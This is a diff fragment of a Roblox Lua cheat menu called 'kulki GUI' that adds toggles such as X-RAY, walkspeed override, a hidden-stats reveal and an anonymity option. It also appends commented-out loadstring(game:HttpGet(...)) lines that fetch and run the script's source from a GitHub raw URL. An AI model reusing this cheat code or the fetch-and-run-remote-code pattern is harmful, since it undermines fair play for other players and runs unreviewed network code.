-RBXGeneral.OnIncomingMessage = function(textmessage:TextChatMessage)
-	listen_pro(textmessage)
-end
 
 
 local function SeeSubspaceTripmine()
@@ -2190,9 +2111,6 @@ local function TurnIntoDummyF()
 	game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("BodyColors").RightArmColor3 = Color3.fromRGB(math.random(1,255),math.random(1,255),math.random(1,255))
 	game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("BodyColors").RightLegColor3 = Color3.fromRGB(math.random(1,255),math.random(1,255),math.random(1,255))
 	game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("BodyColors").HeadColor3 = Color3.fromRGB(math.random(1,255),math.random(1,255),math.random(1,255))
-	if game.Players.LocalPlayer.PlayerGui.MainUI.PlayerListHolder.Contents.Players:FindFirstChild(game.Players.LocalPlayer.Name) then
-		game.Players.LocalPlayer.PlayerGui.MainUI.PlayerListHolder.Contents.Players:FindFirstChild(game.Players.LocalPlayer.Name).PlayerInfo.Username.Text = "CrazyPlayer123"
-	end
 end
 local function placeOpSentry(loc:CFrame)
 	if Client.Character and Client.Character.Name == "Builderman" and game.Players.LocalPlayer.PlayerGui:FindFirstChild("MainUI"):WaitForChild("AbilityContainer"):WaitForChild("Sentry"):WaitForChild("CooldownTime").Text == "" then
@@ -2285,7 +2203,8 @@ createOption("Walkspeed Override Instant Hit","toggle","WalkspeedOverrideInstant
 
 --misc
 createOption("X-RAY","toggle","XRay","Misc",nil,true)
-createOption("NO HIDDEN","toggle","NOHIDDEN","Misc",nil,true)
+createOption("NO HIDDEN STATS","toggle","NOHIDDEN","Misc",nil,true)
+createOption("ANONYMOUS (hides your username from EVERYWHERE to make it safe to record/ss)","toggle","Anonymous","Misc",nil,true)
 --fun
 --[[createOption("HMODE","HARD MODE",HModeF,"HardMode",true,"otheroptions")
 createOption("GETNG666VIS","GET NOLI+GUEST666 (VISUAL)",getNoliGuest666,"UnUsedValue",false,"otheroptions")
@@ -2332,3 +2251,17 @@ end
 
 print("loaded kulki GUI!")
 sGUI.Parent = game:GetService("CoreGui")
+
+
+--https://raw.githubusercontent.com/BBro2137/KulkiGUI/refs/heads/main/source
+--loadstring(game:HttpGet('https://raw.githubusercontent.com/BBro2137/KulkiGUI/refs/heads/main/source'))()
+
+--m1 sound id's
+
+--rbxassetid://101199185291628 --1x
+--rbxassetid://140242176732868 --john doe
+--rbxassetid://102228729296384 --coolkid
+--rbxassetid://112809109188560 --jason
+
+--loadstring(game:HttpGet('https://raw.githubusercontent.com/BBro2137/KulkiGUI/refs/heads/main/source?nocache='..tick())())
+
